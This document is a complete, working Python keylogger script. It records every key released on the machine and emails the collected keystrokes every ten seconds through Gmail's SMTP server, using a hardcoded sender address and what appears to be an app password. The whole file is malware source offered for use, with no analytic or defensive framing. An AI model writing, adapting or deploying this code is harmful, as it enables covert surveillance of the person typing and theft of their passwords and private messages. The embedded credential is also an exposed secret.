#!usr/bin/python3

import keyboard # for keylogs
import smtplib # for sending email using SMTP protocol (gmail)
# Timer is to make a method runs after an `interval` amount of time
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

SEND_REPORT_EVERY = 10 # in seconds, 60 means 1 minute and so on
EMAIL_ADDRESS = "tppythonpython@gmail.com"
EMAIL_PASSWORD = "jnss upda rwgg ftaw"
EMAIL_TO_SEND = "tppythonpython@gmail.com"
SERVER_SMTP = "smtp.gmail.com"

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name
    
    def prepare_mail(self, message):
        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_TO_SEND
        msg["Subject"] = "Keylogger logs"
        html = f"<p>{message}</p>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)
        return msg.as_string()

    def sendmail(self, email, password, message, verbose=1):
        server = smtplib.SMTP(host=SERVER_SMTP, port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, self.prepare_mail(message))
        server.quit()
        if verbose:
            print(f"{datetime.now()} - Sent an email to {email} containing:  {message}")

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        print(f"{datetime.now()} - Started keylogger")
        keyboard.wait()

    
if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()
